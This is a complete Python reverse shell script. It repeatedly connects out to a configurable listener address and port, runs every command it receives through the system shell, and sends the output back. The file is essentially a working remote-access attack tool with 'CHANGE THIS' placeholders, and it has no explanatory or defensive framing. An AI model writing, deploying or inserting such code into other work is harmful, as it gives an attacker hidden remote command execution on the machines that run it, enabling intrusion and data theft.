import socket
import subprocess
import time
import os

LHOST = '192.168.1.186' # CHANGE THIS
LPORT = 4545            # CHANGE THIS

def command_exec(command):
    try:
        if command.startswith("cd "):
            path = command[3:].strip()
            os.chdir(path)
            return b""
        else:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except:
        return b""

def connect():
    while True:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((LHOST, LPORT))
            connection.send("[*] Successfully connected\n".encode())
            return connection
        except socket.error:
            time.sleep(5)

connection = connect()

while True:
    try:
        command_query = connection.recv(4096).decode().strip()

        if not command_query:
            continue

        command_output = command_exec(command_query)
        connection.send(command_output)
    except Exception:
        pass
